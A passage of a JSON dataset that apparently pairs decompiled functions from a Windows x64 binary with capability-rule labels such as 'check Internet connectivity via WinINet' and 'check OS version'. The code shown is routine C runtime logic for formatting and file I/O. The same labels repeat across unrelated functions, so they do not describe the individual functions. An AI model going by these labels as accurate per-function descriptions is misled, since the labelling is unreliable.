*(arg1 + 8);\n        if (*(iVar9 + 0x28) == '\\0') {\n            fcn.140010150(iVar9);\n        }\n        puVar6 = *(arg1 + 0x40);\n        piVar2 = *(iVar9 + 0x18);\n        uVar11 = *puVar6;\n        if (*(uVar11 + piVar2[0x22]) != 'e') {\n            do {\n                puVar6 = puVar6 + 1;\n                uVar11 = *puVar6;\n            } while ((*(*piVar2 + uVar11 * 2) & 4) != 0);\n        }\n        bVar12 = *(uVar11 + piVar2[0x22]) == 'x';\n        if (bVar12) {\n            uVar11 = puVar6[2];\n        }\n        puVar8 = puVar6 + 2;\n        if (!bVar12) {\n            puVar8 = puVar6;\n        }\n        *puVar8 = **piVar2[0x1f];\n        do {\n            puVar8 = puVar8 + 1;\n            uVar1 = *puVar8;\n            uVar10 = uVar11;\n            *puVar8 = uVar10;\n            uVar11 = uVar1;\n        } while (uVar10 != 0);\n    }\n    if (((*(arg1 + 0x39) + 0xb9U & 0xdf) == 0) && ((*(arg1 + 0x28) >> 5 & 1) == 0)) {\n        iVar9 = *(arg1 + 8);\n        if (*(iVar9 + 0x28) == '\\0') {\n            fcn.140010150(iVar9);\n        }\n        fcn.14000e410(*(arg1 + 0x40), iVar9 + 0x18);\n    }\n    pcVar7 = *(arg1 + 0x40);\n    cVar3 = *pcVar7;\n    if (cVar3 == '-') {\n        *(arg1 + 0x28) = *(arg1 + 0x28) | 0x40;\n        pcVar7 = pcVar7 + 1;\n        *(arg1 + 0x40) = pcVar7;\n        cVar3 = *pcVar7;\n    }\n    if ((cVar3 + 0xb7U < 0x26) && ((0x2100000021U >> (cVar3 + 0xb7U & 0x3f) & 1) != 0)) {\n        *(arg1 + 0x28) = *(arg1 + 0x28) & 0xfffffff7;\n        *(arg1 + 0x39) = 0x73;\n    }\n    iVar9 = -1;\n    do {\n        iVar9 = iVar9 + 1;\n    } while (pcVar7[iVar9] != '\\0');\n    *(arg1 + 0x48) = iVar9;\n    return 1;\n}\n",
        "token_count": 1361
    },
    "14000fb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14000fb04(int64_t arg1)\n\n{\n    uint8_t uVar1;\n    int64_t *piVar2;\n    char cVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint8_t *puVar8;\n    char *pcVar9;\n    uint8_t *puVar10;\n    int64_t iVar11;\n    uint8_t uVar12;\n    uint64_t uVar13;\n    int64_t arg4;\n    bool bVar14;\n    ulong uStackX8;\n    \n    *(arg1 + 0x28) = *(arg1 + 0x28) | 0x10;\n    iVar5 = *(arg1 + 0x30);\n    if (iVar5 < 0) {\n        iVar5 = (-((*(arg1 + 0x3a) - 0x41U & 0xffdf) != 0) & 0xfffffff9) + 0xd;\n        *(arg1 + 0x30) = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(arg1 + 0x3a) == 0x67 || (iVar5 = 0,  *(arg1 + 0x3a) == 0x47)))) {\n        *(arg1 + 0x30) = 1;\n        iVar5 = 1;\n    }\n    iVar11 = arg1 + 0x50;\n    cVar3 = fcn.14000c4a8(iVar11, iVar5 + 0x15d, *(arg1 + 8));\n    uVar13 = 0x200;\n    if (cVar3 == '\\0') {\n        if (*(arg1 + 0x458) == 0) {\n            iVar5 = 0x200;\n        }\n        else {\n            iVar5 = *(arg1 + 0x450) >> 1;\n        }\n        *(arg1 + 0x30) = iVar5 + -0x15d;\n    }\n    iVar7 = *(arg1 + 0x458);\n    if (*(arg1 + 0x458) == 0) {\n        iVar7 = iVar11;\n    }\n    *(arg1 + 0x40) = iVar7;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    iVar7 = *(arg1 + 0x458);\n    uStackX8 = *(*(arg1 + 0x18) + -8);\n    if (iVar7 == 0) {\n        arg4 = arg1 + 0x250;\n        iVar7 = iVar11;\n    }\n    else {\n        arg4 = (*(arg1 + 0x450) >> 1) + iVar7;\n        uVar13 = *(arg1 + 0x450) >> 1;\n    }\n    fcn.14001b5a4(&uStackX8, iVar7, uVar13, arg4);\n    if (((*(arg1 + 0x28) >> 5 & 1) != 0) && (*(arg1 + 0x30) == 0)) {\n        iVar11 = *(arg1 + 8);\n        if (*(iVar11 + 0x28) == '\\0') {\n            fcn.140010150(iVar11);\n        }\n        puVar8 = *(arg1 + 0x40);\n        piVar2 = *(iVar11 + 0x18);\n        uVar13 = *puVar8;\n        if (*(uVar13 + piVar2[0x22]) != 'e') {\n            do {\n                puVar8 = puVar8 + 1;\n                uVar13 = *puVar8;\n            } while ((*(*piVar2 + uVar13 * 2) & 4) != 0);\n        }\n        bVar14 = *(uVar13 + piVar2[0x22]) == 'x';\n        if (bVar14) {\n            uVar13 = puVar8[2];\n        }\n        puVar10 = puVar8 + 2;\n        if (!bVar14) {\n            puVar10 = puVar8;\n        }\n        *puVar10 = **piVar2[0x1f];\n        do {\n            puVar10 = puVar10 + 1;\n            uVar1 = *puVar10;\n            uVar12 = uVar13;\n            *puVar10 = uVar12;\n            uVar13 = uVar1;\n        } while (uVar12 != 0);\n    }\n    uVar4 = *(arg1 + 0x3a) - 0x47;\n    uVar13 = uVar4;\n    if (((uVar4 & 0xffdf) == 0) && (uVar6 = *(arg1 + 0x28) >> 5,  uVar13 = uVar6,  (uVar6 & 1) == 0)) {\n        iVar11 = *(arg1 + 8);\n        if (*(iVar11 + 0x28) == '\\0') {\n            fcn.140010150(iVar11);\n        }\n        uVar13 = fcn.14000e410(*(arg1 + 0x40), iVar11 + 0x18);\n    }\n    pcVar9 = *(arg1 + 0x40);\n    cVar3 = *pcVar9;\n    uVar13 = uVar13 & 0xffffffffffffff00;\n    if (cVar3 == '-') {\n        *(arg1 + 0x28) = *(arg1 + 0x28) | 0x40;\n        pcVar9 = pcVar9 + 1;\n        *(arg1 + 0x40) = pcVar9;\n        cVar3 = *pcVar9;\n    }\n    if ((cVar3 + 0xb7U < 0x26) && ((0x2100000021U >> (cVar3 + 0xb7U & 0x3f) & 1) != 0)) {\n        *(arg1 + 0x28) = *(arg1 + 0x28) & 0xfffffff7;\n        uVar13 = 0;\n        *(arg1 + 0x3a) = 0x73;\n    }\n    iVar11 = -1;\n    do {\n        iVar11 = iVar11 + 1;\n    } while (pcVar9[iVar11] != '\\0');\n    *(arg1 + 0x48) = iVar11;\n    return CONCAT71(uVar13 >> 8, 1);\n}\n",
        "token_count": 1457
    },
    "14000fee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14000feec(int64_t arg1)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    \n    *(arg1 + 0x18) = *(arg1 + 0x18) + 8;\n    puVar1 = *(*(arg1 + 0x18) + -8);\n    uVar3 = fcn.14001bbdc();\n    if (uVar3 == 0) goto code_r0x00014000ff0f;\n    iVar4 = *(arg1 + 0x34);\n    if (iVar4 < 6) {\n        if (iVar4 != 5) {\n            if (iVar4 != 0) {\n                if (iVar4 == 1) {\n                    uVar3 = uVar3 & 0xffffffffffffff00;\n                    *puVar1 = *(arg1 + 0x20);\n                    goto code_r0x00014000ff88;\n                }\n                iVar4 = iVar4 + -2;\n                if (iVar4 == 0) {\n                    uVar3 = *(arg1 + 0x20);\n                    *puVar1 = *(arg1 + 0x20);\n                    goto code_r0x00014000ff88;\n                }\n                goto code_r0x00014000ff77;\n            }\ncode_r0x00014000ff99:\n            uVar3 = *(arg1 + 0x20);\n            *puVar1 = *(arg1 + 0x20);\n            goto code_r0x00014000ff88;\n        }\n    }\n    else if (((iVar4 != 6) && (iVar4 != 7)) && (iVar4 = iVar4 + -9,  iVar4 != 0)) {\ncode_r0x00014000ff77:\n        if (iVar4 == 1) goto code_r0x00014000ff99;\n        if (iVar4 != 2) {\ncode_r0x00014000ff0f:\n            iVar2 = *(arg1 + 8);\n            *(iVar2 + 0x30) = 1;\n            *(iVar2 + 0x2c) = 0x16;\n            uVar3 = fcn.14000bf58(0, 0, 0, 0);\n            return uVar3 & 0xffffffffffffff00;\n        }\n    }\n    uVar3 = *(arg1 + 0x20);\n    *puVar1 = uVar3;\ncode_r0x00014000ff88:\n    *(arg1 + 0x38) = 1;\n    return CONCAT71(uVar3 >> 8, 1);\n}\n",
        "token_count": 590
    },
    "1400100d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.1400100d0(int64_t arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    arg1_00 = *(arg1 + 8);\n    if (*(arg1_00 + 0x28) == '\\0') {\n        fcn.140010150(arg1_00);\n    }\n    puVar2 = *(arg1 + 0x40);\n    iVar3 = 0;\n    if (0 < arg2) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            puVar1 = puVar2 + 1;\n            if ((*(**(arg1_00 + 0x18) + *puVar2 * 2) & 0x8000) == 0) {\n                puVar1 = puVar2;\n            }\n            iVar3 = iVar3 + 1;\n            puVar2 = puVar1 + 1;\n        } while (iVar3 < arg2);\n    }\n    return iVar3;\n}\n",
        "token_count": 253
    },
    "14001030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14001030c(int64_t *arg1, char *arg2, ulong arg3, int32_t *arg4)\n\n{\n    ulong uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    bool bVar4;\n    int64_t in_stack_00000028;\n    \n    pcVar3 = arg2 + arg3;\n    bVar4 = arg2 == pcVar3;\n    uVar1 = *(in_stack_00000028 + 0x2c);\n    do {\n        if (bVar4) {\ncode_r0x0001400103ba:\n            *(in_stack_00000028 + 0x2c) = uVar1;\n            return;\n        }\n        if (((*(*arg1 + 0x14) >> 0xc & 1) == 0) || (*(*arg1 + 8) != 0)) {\n            iVar2 = fcn.140010f8c(*arg2, *arg1, in_stack_00000028);\n            if (iVar2 != -1) goto code_r0x0001400103a8;\n            if ((*(in_stack_00000028 + 0x30) == '\\0') || (*(in_stack_00000028 + 0x2c) != 0x2a)) {\n                *arg4 = -1;\n                goto code_r0x0001400103ba;\n            }\n            if (((*(*arg1 + 0x14) >> 0xc & 1) != 0) && (*(*arg1 + 8) == 0)) goto code_r0x0001400103a8;\n            iVar2 = fcn.140010f8c(0x3f, *arg1, in_stack_00000028);\n            if (iVar2 != -1) goto code_r0x0001400103a8;\n            *arg4 = -1;\n        }\n        else {\ncode_r0x0001400103a8:\n            *arg4 = *arg4 + 1;\n        }\n        arg2 = arg2 + 1;\n        bVar4 = arg2 == pcVar3;\n    } while( true );\n}\n",
        "token_count": 478
    },
    "1400103d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_11h\n\nuint fcn.1400103d8(ulong arg1, int64_t arg2, int64_t arg3, uint *arg4)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t var_fh;\n    ulong var_17h;\n    int64_t var_1fh;\n    ulong var_27h;\n    ulong var_2fh;\n    ulong var_5fh;\n    ulong var_67h;\n    ulong var_6fh;\n    ulong var_77h;\n    int64_t aiStack152 [2];\n    uchar uStack136;\n    uchar auStack128 [16];\n    char cStack112;\n    uint uStack108;\n    char cStack104;\n    uint uStack100;\n    char cStack96;\n    int64_t iStack88;\n    uchar auStack80 [7];\n    int64_t var_41h;\n    uchar auStack64 [7];\n    int64_t var_31h;\n    int64_t var_29h;\n    uchar auStack40 [7];\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    aiStack152[0] = 0;\n    uStack136 = 0;\n    cStack112 = '\\0';\n    cStack104 = '\\0';\n    cStack96 = '\\0';\n    if (arg4 == NULL) {\n        uVar1 = *0x14003e3b8;\n        uVar3 = *0x14003e3bc;\n        uVar4 = *0x14003e3c0;\n        uVar5 = *0x14003e3c4;\n        if (*0x1400401e0 != 0) goto code_r0x000140010421;\n    }\n    else {\n        uVar1 = *arg4;\n        uVar3 = arg4[1];\n        uVar4 = arg4[2];\n        uVar5 = arg4[3];\n    }\n    cStack112 = '\\x01';\n    auStack128 = CONCAT412(uVar5, CONCAT48(uVar4, CONCAT44(uVar3, uVar1)));\ncode_r0x000140010421:\n    unique0x1000021f = arg2;\n    unique0x10000227 = arg1;\n    unique0x1000022f = arg3;\n    if ((arg2 == 0) || (arg3 == 0)) {\n        cStack104 = '\\x01';\n        uStack108 = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        unique0x00003100 = &var_fh + 1;\n        _auStack64 = aiStack152;\n        unique0x00003100 = &var_17h + 1;\n        unique0x00003100 = &var_1fh + 1;\n        _auStack40 = &var_27h + 1;\n        iStack88 = arg2;\n        _auStack80 = arg2;\n        uVar1 = fcn.14000c2b0(&var_2fh + 1, auStack80, &var_41h + 1, &iStack88);\n    }\n    uVar3 = uStack108;\n    if (cStack112 == '\\x02') {\n        *(aiStack152[0] + 0x3a8) = *(aiStack152[0] + 0x3a8) & 0xfffffffd;\n    }\n    if (cStack104 != '\\0') {\n        iVar2 = fcn.14000bc38(aiStack152);\n        *(iVar2 + 0x20) = uVar3;\n    }\n    if (cStack96 != '\\0') {\n        iVar2 = fcn.14000bc38(aiStack152);\n        *(iVar2 + 0x24) = uStack100;\n    }\n    return uVar1;\n}\n",
        "token_count": 939
    },
    "14001080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.14001080c(ulong param_1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x14003e3b8;\n        var_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    uVar1 = fcn.1400106ec(param_1, &var_40h);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 439
    },
    "1400108a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400108a4(ulong noname_0, ulong *arg2, int64_t **arg3, ulong *arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    fcn.14000c298(*arg2);\n    if ((**arg3 != 0) && (uVar1 = *(**arg3 + 0x14),  (uVar1 >> 0xd & 1) != 0)) {\n        if ((((uVar1 & 3) == 2) && ((uVar1 & 0xc0) != 0)) || ((uVar1 >> 0xb & 1) != 0)) {\n            if ((*arg3[2] != '\\0') || ((*(**arg3 + 0x14) >> 1 & 1) != 0)) {\n                iVar2 = fcn.140010b4c(**arg3);\n                if (iVar2 == -1) {\n                    *arg3[3] = 0xffffffff;\n                }\n                else {\n                    *arg3[1] = *arg3[1] + 1;\n                }\n            }\n        }\n        else {\n            *arg3[1] = *arg3[1] + 1;\n        }\n    }\n    fcn.14000c2a4(*arg4);\n    return;\n}\n",
        "token_count": 300
    },
    "140010b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.140010b4c(int64_t arg1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x14003e3b8;\n        var_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    if (arg1 == 0) {\n        uVar1 = fcn.140010a60(0);\n        goto code_r0x000140010bd0;\n    }\n    iVar2 = fcn.140010ac0(arg1, &var_40h);\n    if (iVar2 == 0) {\n        if ((*(arg1 + 0x14) >> 0xb & 1) != 0) {\n            uVar3 = fcn.14001bbb4(arg1);\n            iVar2 = fcn.14001bff4(uVar3);\n            if (iVar2 != 0) goto code_r0x000140010bac;\n        }\n        uVar1 = 0;\n    }\n    else {\ncode_r0x000140010bac:\n        uVar1 = 0xffffffff;\n    }\ncode_r0x000140010bd0:\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar4 = fcn.14000bc38(&var_40h);\n        *(iVar4 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar4 = fcn.14000bc38(&var_40h);\n        *(iVar4 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 621
    },
    "140010cd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.140010cd4(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack56 [32];\n    uchar *puStack24;\n    \n    puStack24 = &stack0xffffffffffffffc8;\n    if (arg1 == 0) {\n        puStack24 = &stack0xffffffffffffffc8;\n        puVar3 = fcn.140012c78();\n        *puVar3 = 0x16;\n        fcn.14000c028();\n        return 0xffffffff;\n    }\n    fcn.14000c298(arg1);\n    if ((*(arg1 + 0x14) >> 0xc & 1) == 0) {\n        uVar1 = fcn.14001bbb4(arg1);\n        if (uVar1 + 2 < 2) {\n            iVar5 = 0x14003e3d0;\n        }\n        else {\n            iVar5 = *((uVar1 >> 6) * 8 + 0x1400403d0) + (uVar1 & 0x3f) * 0x48;\n        }\n        iVar4 = 0x14003e3d0;\n        if (*(iVar5 + 0x39) == '\\0') {\n            if (1 < uVar1 + 2) {\n                iVar4 = *((uVar1 >> 6) * 8 + 0x1400403d0) + (uVar1 & 0x3f) * 0x48;\n            }\n            if ((*(iVar4 + 0x3d) & 1) == 0) goto code_r0x000140010dc8;\n        }\n        puVar3 = fcn.140012c78();\n        *puVar3 = 0x16;\n        fcn.14000c028();\n        fcn.1400298c8(puStack24, 0x140010dc0);\n        uVar2 = 0xffffffff;\n    }\n    else {\ncode_r0x000140010dc8:\n        uVar2 = fcn.140010c90(arg1);\n        fcn.14000c2a4(arg1);\n    }\n    return uVar2;\n}\n",
        "token_count": 511
    },
    "140010e3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.140010e30(ulong arg1, int64_t *arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack72 [32];\n    ulong uStack40;\n    int64_t iStack32;\n    uchar *puStack24;\n    \n    puStack24 = &stack0xffffffffffffffb8;\n    iStack32 = arg3;\n    if (arg2 == NULL) {\n        *(arg3 + 0x30) = 1;\n        *(arg3 + 0x2c) = 0x16;\n        uStack40 = 0;\n        puStack24 = &stack0xffffffffffffffb8;\n        fcn.14000bf58(0, 0, 0, 0);\n        return 0xffffffff;\n    }\n    fcn.14000c298(arg2);\n    if ((*(arg2 + 0x14) >> 0xc & 1) == 0) {\n        uVar2 = fcn.14001bbb4(arg2);\n        if (uVar2 + 2 < 2) {\n            iVar4 = 0x14003e3d0;\n        }\n        else {\n            iVar4 = *((uVar2 >> 6) * 8 + 0x1400403d0) + (uVar2 & 0x3f) * 0x48;\n        }\n        iVar3 = 0x14003e3d0;\n        if (*(iVar4 + 0x39) == '\\0') {\n            if (1 < uVar2 + 2) {\n                iVar3 = *((uVar2 >> 6) * 8 + 0x1400403d0) + (uVar2 & 0x3f) * 0x48;\n            }\n            if ((*(iVar3 + 0x3d) & 1) == 0) goto code_r0x000140010f58;\n        }\n        *(arg3 + 0x30) = 1;\n        *(arg3 + 0x2c) = 0x16;\n        uStack40 = 0;\n        fcn.14000bf58(0, 0, 0, 0);\n        fcn.1400298c8(puStack24, 0x140010f50);\n        arg1._0_4_ = 0xffffffff;\n    }\n    else {\ncode_r0x000140010f58:\n        piVar1 = arg2 + 2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 < 0) {\n            arg1._0_4_ = fcn.14001d54c(arg1, arg2, arg3);\n        }\n        else {\n            **arg2 = arg1;\n            *arg2 = *arg2 + 1;\n            arg1._0_4_ = arg1 & 0xff;\n        }\n        fcn.14000c2a4(arg2);\n    }\n    return arg1;\n}\n",
        "token_count": 687
    },
    "140010fa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.140010fa4(ulong param_1, ulong param_2)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x14003e3b8;\n        var_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    uVar1 = fcn.140010e30(param_1, param_2, &var_40h);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 448
    },
    "14001143": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140011430(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    uint64_t in_RAX;\n    int64_t iVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    \n    if ((((arg3 != 2) && (in_RAX = *(arg1 + 0x14),  (*(arg1 + 0x14) & 0x4c0) != 0)) &&\n        (in_RAX = *(arg1 + 0x14),  (*(arg1 + 0x14) & 6) == 0)) && (0 < *(arg1 + 2))) {\n        uVar1 = *(arg1 + 3);\n        in_RAX = uVar1 >> 6;\n        iVar3 = *(in_RAX * 8 + 0x1400403d0);\n        if ((-1 < *(iVar3 + 0x38 + (uVar1 & 0x3f) * 0x48)) && (*(iVar3 + 0x39 + (uVar1 & 0x3f) * 0x48) == '\\0')) {\n            iVar3 = arg2;\n            if (arg3 == 0) {\n                in_RAX = fcn.14001e29c(uVar1 & 0xffffffff, 0, 1);\n                if (in_RAX < 0) goto code_r0x000140011507;\n                iVar2 = in_RAX - *(arg1 + 2);\n                iVar3 = arg2 - iVar2;\n                iVar4 = -(arg2 >> 0x3f);\n                in_RAX = *(arg1 + 2);\n                if ((iVar4 != -(iVar2 >> 0x3f)) && (in_RAX = 0,  iVar4 != -(iVar3 >> 0x3f))) goto code_r0x000140011507;\n            }\n            if ((arg1[1] - *arg1 <= iVar3) && (iVar3 <= *(arg1 + 2))) {\n                *arg1 = *arg1 + iVar3;\n                *(arg1 + 2) = *(arg1 + 2) - iVar3;\n                return CONCAT71(in_RAX >> 8, 1);\n            }\n        }\n    }\ncode_r0x000140011507:\n    return in_RAX & 0xffffffffffffff00;\n}\n",
        "token_count": 536
    },
    "14001151": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140011514(ulong *arg1, int64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    \n    uVar4 = arg3;\n    if ((*(arg1 + 0x14) >> 0xd & 1) == 0) {\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 0x16;\ncode_r0x00014001154b:\n        uVar2 = 0xffffffff;\n    }\n    else {\n        LOCK();\n        *(arg1 + 0x14) = *(arg1 + 0x14) & 0xfffffff7;\n        cVar1 = fcn.140011430(arg1, arg2, arg3);\n        if (cVar1 == '\\0') {\n            if (uVar4 == 1) {\n                iVar3 = fcn.14001d3d0(arg1, arg4);\n                arg2 = arg2 + iVar3;\n                uVar4 = 0;\n            }\n            fcn.140010ac0(arg1, arg4);\n            *(arg1 + 2) = 0;\n            *arg1 = arg1[1];\n            if ((*(arg1 + 0x14) >> 2 & 1) == 0) {\n                if (((*(arg1 + 0x14) & 0x41) == 0x41) && ((*(arg1 + 0x14) >> 8 & 1) == 0)) {\n                    *(arg1 + 4) = 0x200;\n                }\n            }\n            else {\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) & 0xfffffffc;\n            }\n            iVar3 = fcn.14001e338(*(arg1 + 3), arg2, uVar4, arg4);\n            if (iVar3 == -1) goto code_r0x00014001154b;\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 484
    },
    "1400115e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
